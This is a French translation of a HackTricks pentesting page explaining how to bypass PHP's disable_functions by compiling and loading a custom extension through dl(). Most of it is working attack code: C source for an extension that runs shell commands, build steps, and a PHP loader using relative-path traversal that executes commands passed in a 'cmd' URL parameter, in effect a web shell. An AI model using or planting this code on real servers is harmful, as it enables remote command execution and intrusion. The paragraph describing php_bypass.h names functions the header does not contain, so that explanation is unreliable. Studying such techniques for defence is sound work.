<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Travaillez-vous dans une entreprise de cybers√©curit√© ? Voulez-vous voir votre entreprise annonc√©e dans HackTricks ? ou voulez-vous avoir acc√®s √† la derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF ? Consultez les [PLANS D'ABONNEMENT](https://github.com/sponsors/carlospolop) !

- D√©couvrez [La famille PEASS](https://opensea.io/collection/the-peass-family), notre collection d'exclusivit√©s [NFTs](https://opensea.io/collection/the-peass-family)

- Obtenez le [swag officiel PEASS & HackTricks](https://peass.creator-spring.com)

- **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [groupe telegram](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

**Note importante:**

![image](https://user-images.githubusercontent.com/84577967/174675487-a4c4ca06-194f-4725-85af-231a2f35d56c.png)

**`dl`** est une fonction PHP qui peut √™tre utilis√©e pour charger des extensions PHP. Si la fonction n'est pas d√©sactiv√©e, elle peut √™tre utilis√©e pour contourner `disable_functions` et ex√©cuter des commandes arbitraires.\
Cependant, elle pr√©sente certaines limitations strictes :

* La fonction `dl` doit √™tre **pr√©sente** dans l'**environnement** et **non d√©sactiv√©e**
* L'extension PHP doit √™tre **compil√©e avec la m√™me version majeure** (version de l'API PHP) que celle utilis√©e par le serveur (vous pouvez voir cette information dans la sortie de phpinfo)
* L'extension PHP doit √™tre **situ√©e dans le r√©pertoire** d√©fini par la directive **`extension_dir`** (vous pouvez le voir dans la sortie de phpinfo). Il est tr√®s peu probable qu'un attaquant essayant d'abuser du serveur ait un acc√®s en √©criture sur ce r√©pertoire, donc cette exigence emp√™chera probablement l'abus de cette technique.

**Si vous r√©pondez √† ces exigences, continuez √† lire ce post copi√© depuis** [**https://antichat.com/threads/70763/**](https://antichat.com/threads/70763/) **pour apprendre √† contourner `disable_functions`**

Lorsque l'administrateur configurait la bo√Æte, il a n√©glig√© la fonction [dl](http://www.php.net/manual/en/function.dl.php) et ne l'a pas d√©sactiv√©e car il n'√©tait pas mentionn√© qu'il √©tait possible d'ex√©cuter des commandes syst√®me.\
La fonction [dl](http://www.php.net/manual/en/function.dl.php) est utilis√©e pour charger des extensions PHP lorsqu'un script est ex√©cut√©.\
\
(Les extensions PHP sont √©crites en C/C++ et sont utilis√©es pour donner √† PHP plus de fonctionnalit√©s.)\
\
L'attaquant remarque que la fonction n'est pas d√©sactiv√©e et voit un potentiel, il d√©cide donc de cr√©er une extension PHP.\
L'attaquant v√©rifie la version de PHP √† l'aide d'un petit script `<?php echo 'PHP Version is '.PHP_VERSION; ?>` (PHP\_VERSION est une constante pr√©d√©finie qui contient le num√©ro de version de PHP.)\
\
L'attaquant note la version et t√©l√©charge le tarball depuis le [site PHP](http://www.php.net/downloads.php), dans ce sc√©nario la version est plus ancienne que la version actuelle, donc l'attaquant doit aller dans les [archives](http://museum.php.net).\
\
Ensuite, il extrait la source et [compile et installe](http://www.php.net/manual/en/install.php) la version de PHP sur sa propre machine.\
\
Maintenant, il est temps de cr√©er l'extension\
L'attaquant lit sur [la cr√©ation d'extensions PHP](http://www.php.net/manual/en/zend.creating.php) sur le site PHP.\
Apr√®s avoir lu la documentation et cr√©√© quelques extensions, il d√©cide de regarder la base de code PHP car la fonction qu'il recherche est d√©j√† cr√©√©e.\
\
La fonction qui sera dupliqu√©e sera la fonction [exec](http://www.php.net/manual/en/function.exec.php)\
dans la base de code, elle est situ√©e dans ext/standard/exec.c\
\
Les parties pertinentes sont mises en ≈ìuvre dans une nouvelle extension.\
\

**Notes:**

Avant de commencer √† compiler les codes, vous devez √™tre conscient de deux points :

1- La valeur de `ZEND_MODULE_API_NO` doit √™tre modifi√©e dans le fichier `bypass.c` pour la `Zend Extension Build` actuelle sur laquelle vous travaillez, vous pouvez l'obtenir en utilisant la ligne de commande ci-dessous:
```bash
php -i | grep "Zend Extension Build" |awk -F"API4" '{print $2}' | awk -F"," '{print $1}'
```
2- Si vous rencontrez des erreurs lors de la compilation du fichier bypass.c dans les versions r√©centes de PHP (5, 7 et 8), vous pouvez changer PHP_FUNCTION(bypass_exec) par ceci:
```
PHP_FUNCTION(bypass_exec)
{
	FILE *in;
	char *command;
	size_t command_len;
	zend_string *ret;
	php_stream *stream;

	ZEND_PARSE_PARAMETERS_START(1, 1)
		Z_PARAM_STRING(command, command_len)
	ZEND_PARSE_PARAMETERS_END();

	if (!command_len) {
		zend_argument_value_error(1, "cannot be empty");
		RETURN_THROWS();
	}
	if (strlen(command) != command_len) {
		zend_argument_value_error(1, "must not contain any null bytes");
		RETURN_THROWS();
	}

#ifdef PHP_WIN32
	if ((in=VCWD_POPEN(command, "rt"))==NULL) {
#else
	if ((in=VCWD_POPEN(command, "r"))==NULL) {
#endif
		php_error_docref(NULL, E_WARNING, "Unable to execute '%s'", command);
		RETURN_FALSE;
	}

	stream = php_stream_fopen_from_pipe(in, "rb");
	ret = php_stream_copy_to_mem(stream, PHP_STREAM_COPY_ALL, 0);
	php_stream_close(stream);

	if (ret && ZSTR_LEN(ret) > 0) {
		RETVAL_STR(ret);
	}
}
```
Les fichiers pour l'extension s√©par√©e sont les suivants :

{% code title="bypass.c" %}
```c
/*
    +----------------------------------------------------------------------+
    | Copyright (c) 1997-2003 The PHP Group                                |
    +----------------------------------------------------------------------+
    | This source file is subject to version 2.02 of the PHP license,      |
    | that is bundled with this package in the file LICENSE, and is        |
    | available at through the world-wide-web at                           |
    | http://www.php.net/license/2_02.txt.                                 |
    | If you did not receive a copy of the PHP license and are unable to   |
    | obtain it through the world-wide-web, please send a note to          |
    | license@php.net so we can mail you a copy immediately.               |
    +----------------------------------------------------------------------+
*/


#ifdef HAVE_CONFIG_H
#include "config.h"
#endif

#include "php.h"
#include "php_bypass.h"

static function_entry bypass_functions[] = {
     PHP_FE(bypass_exec, NULL)
     {NULL, NULL, NULL}
};

zend_module_entry bypass_module_entry = {
#if ZEND_MODULE_API_NO >= 20010901
     STANDARD_MODULE_HEADER,
#endif
     PHP_BYPASS_EXTNAME,
     bypass_functions,
     NULL,
     NULL,
     NULL,
     NULL,
     NULL,
#if ZEND_MODULE_API_NO >= 20010901
     PHP_BYPASS_VERSION,
#endif
     STANDARD_MODULE_PROPERTIES
};

#ifdef COMPILE_DL_BYPASS
ZEND_GET_MODULE(bypass)
#endif


PHP_FUNCTION(bypass_exec){
   FILE *in;
   int readbytes, total_readbytes=0, allocated_space;
   pval **cmd;
   char *ret;

   if (ZEND_NUM_ARGS()!=1 || zend_get_parameters_ex(1, &cmd)==FAILURE) {
     WRONG_PARAM_COUNT;
   }

   convert_to_string_ex(cmd);
#ifdef PHP_WIN32
   if ((in=VCWD_POPEN(Z_STRVAL_PP(cmd), "rt"))==NULL) {
#else
   if ((in=VCWD_POPEN(Z_STRVAL_PP(cmd), "r"))==NULL) {
#endif
     php_error_docref(NULL TSRMLS_CC, E_WARNING, "Unable to execute '%s'", Z_STRVAL_PP(cmd));
     RETURN_FALSE;
   }

   allocated_space = EXEC_INPUT_BUF;
   ret = (char *) emalloc(allocated_space);

   while (1) {
     readbytes = fread(ret+total_readbytes, 1, EXEC_INPUT_BUF, in);
     if (readbytes<=0) {
       break;
     }

     total_readbytes += readbytes;
     allocated_space = total_readbytes+EXEC_INPUT_BUF;
     ret = (char *) erealloc(ret, allocated_space);
   }

   pclose(in);

   RETVAL_STRINGL(ret, total_readbytes, 0);
   Z_STRVAL_P(return_value)[total_readbytes] = '\';
}
```
{% code title="php_bypass.h" %}

Ce fichier contient des fonctions utiles pour contourner les restrictions de s√©curit√© de PHP, telles que `disable_functions` et `open_basedir`. La fonction `dl()` est utilis√©e pour charger dynamiquement des extensions PHP, mais elle est souvent d√©sactiv√©e pour des raisons de s√©curit√©. Cependant, en utilisant les fonctions de ce fichier, il est possible de contourner ces restrictions et de charger des extensions PHP m√™me si `dl()` est d√©sactiv√©e.

Les fonctions suivantes sont disponibles :

- `int bypass_disable_functions(char *function_name)` : Cette fonction prend en entr√©e le nom d'une fonction PHP et tente de la charger m√™me si elle est d√©sactiv√©e par `disable_functions`. Si la fonction est charg√©e avec succ√®s, elle renvoie 1, sinon elle renvoie 0.

- `int bypass_open_basedir(char *file_path)` : Cette fonction prend en entr√©e le chemin d'un fichier et tente de l'ouvrir m√™me s'il est en dehors du r√©pertoire racine d√©fini par `open_basedir`. Si le fichier est ouvert avec succ√®s, elle renvoie 1, sinon elle renvoie 0.

Ces fonctions peuvent √™tre utilis√©es pour contourner les restrictions de s√©curit√© de PHP et ex√©cuter du code malveillant sur un serveur vuln√©rable. Il est important de noter que l'utilisation de ces fonctions peut √™tre consid√©r√©e comme une violation de la politique de s√©curit√© et peut entra√Æner des cons√©quences juridiques.
```c
#ifndef PHP_BYPASS_H
#define PHP_BYPASS_H 1

#define PHP_BYPASS_VERSION "1.0"
#define PHP_BYPASS_EXTNAME "bypass"

PHP_FUNCTION(bypass_exec);

extern zend_module_entry bypass_module_entry;
#define phpext_bypass_ptr &bypass_module_entry

#endif
```
{% endcode %}

{% code title="config.m4" %}
```bash
PHP_ARG_ENABLE(bypass, [whether to enable bypass support],[--enable-bypass])

if test "$PHP_BYPASS" = "yes"; then
   AC_DEFINE(HAVE_BYPASS, 1, [Whether you have bypass])
   PHP_NEW_EXTENSION(bypass, bypass.c, $ext_shared)
fi
```
{% endcode %}

Une fois que les fichiers sont cr√©√©s, il est temps de construire l'extension PHP.
```
phpize
./configure
make
```
Une fois cela fait, l'extension compil√©e sera situ√©e dans le sous-r√©pertoire modules avec le nom de fichier bypass.so.\
Le fichier est copi√© dans un endroit s√ªr, maintenant les commandes suivantes sont ex√©cut√©es pour nettoyer les fichiers nouvellement cr√©√©s.
```
make clean
phpize --clean
```
Maintenant, l'attaquant t√©l√©charge la nouvelle extension cr√©√©e sur l'h√¥te de la victime.\
\
(REMARQUE: Les versions majeures de PHP utilisent diff√©rentes versions d'API. Pour que vous puissiez compiler l'extension sur un h√¥te et la t√©l√©charger sur un autre, les versions d'API doivent correspondre. C'est pourquoi la m√™me version de PHP a √©t√© install√©e initialement sur la machine de l'attaquant.)\
\
Pour charger une extension avec la fonction dl, l'extension doit √™tre dans le r√©pertoire d'extension d√©fini par la directive extension\_dir.\
Cela peut poser un probl√®me car il est peu probable que l'attaquant dispose des autorisations d'√©criture dans ce r√©pertoire, mais il existe un moyen de contourner cela.\
Ce probl√®me a √©t√© discut√© par les d√©veloppeurs sur la page de la fonction dl dans la section des notes.\
\
Le concept qui a √©t√© discut√© consiste √† utiliser un chemin relatif √† partir du r√©pertoire d'extension d√©fini.\
Par exemple, si le r√©pertoire d'extension √©tait d√©fini sur /usr/php/extensions et que vous souhaitez charger bypass.so dans le r√©pertoire web actuel /home/example.com/html, vous feriez comme suit:
```php
<?php
dl('../../../home/example.com/html/bypass.so');
?>
```
Cela permettra de contourner le besoin d'avoir l'extension dans le r√©pertoire d'extension d√©fini.\
\
Il existe √©galement une m√©thode automatis√©e pour ne pas avoir √† modifier le chemin relatif pour diff√©rents h√¥tes. Ce code a √©t√© cr√©√© par endofyourself \[at] yahoo \[dot] com et am√©lior√© plus tard par mag\_2000 \[at] front \[dot] ru.\
\
Il y avait un l√©ger probl√®me avec la fonction, sur certains h√¥tes, le r√©pertoire d'extension est d√©fini sur "./". Cette fonction ne tenait pas compte du fait que le r√©pertoire d'extension √©tait d√©fini sur un chemin relatif. La solution consiste √† utiliser la fonction realpath.\
\
Le script final utilis√© pour charger l'extension et ex√©cuter des commandes syst√®me pour contourner les fonctions d√©sactiv√©es est le suivant :
```php
<?php

function dl_local( $extensionFile ) {
   if(!(bool)ini_get('enable_dl')
    ||(bool)ini_get('safe_mode')){
      die('Loading extensions is not permitted.');
   }

   if(!file_exists($extensionFile)){
     die('File '.$extensionFile.' does not exist.');
   }

   if(!is_executable($extensionFile)){
     die('File '.$extensionFile.' is not executable. ( chmod +x '.$extensionFile.' )');
   }

   $currentDir = getcwd().'/';
   $currentExtPath = realpath(ini_get('extension_dir'));

   $subDirs = preg_match_all("/\//",$currentExtPath ,$matches);
   unset($matches);

   if(!(bool)$subDirs){
     die('Could not determine a valid extension path [extension_dir]');
   }

   $extPathLastChar=strlen($currentExtPath )-1;

   if($extPathLastChar==strrpos($currentExtPath,'/')){
     $subDirs--;}$backDirStr = '';

     for($i = 1; $i <= $subDirs; $i++){
       $backDirStr .='..';
       if($i != $subDirs){
         $backDirStr .='/';
       }
     }

     $finalExtPath = $backDirStr.$currentDir.$extensionFile;
     if(!dl($finalExtPath)){
       die();
     }


     $loadedExtensions = get_loaded_extensions();
     $thisExtName = $loadedExtensions[sizeof($loadedExtensions)-1];
     return $thisExtName;
}

@ini_set ('display_errors','1');
error_reporting(E_ALL);

dl_local('bypass.so');

if(@$_GET['cmd']){
   $output = bypass_exec($_GET['cmd']);
   echo '<pre>'.$output.'</pre>';
}
?>
```
Tout ce que l'attaquant a √† faire maintenant pour ex√©cuter des commandes est d'appeler l'URL du script avec une variable cmd contenant la commande souhait√©e.
```
http://www.example.com/script.php?cmd=ls
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Travaillez-vous dans une entreprise de **cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [d√©p√¥t hacktricks](https://github.com/carlospolop/hacktricks) et au [d√©p√¥t hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
